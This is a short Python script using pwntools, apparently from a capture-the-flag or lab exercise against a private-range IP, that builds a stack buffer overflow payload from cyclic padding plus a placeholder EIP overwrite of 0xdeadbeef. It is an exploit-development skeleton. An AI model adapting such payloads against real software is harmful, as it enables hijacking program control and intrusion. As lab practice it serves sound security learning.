#pwntools
#10.10.102.104


#jaaa

from pwn import *

#padding = cyclic(100)
padding = cyclic(cyclic_find('jaaa'))

#check the padding is correct p32 or p64
eip= p32(0xdeadbeef)

payload = padding + eip

print(payload)
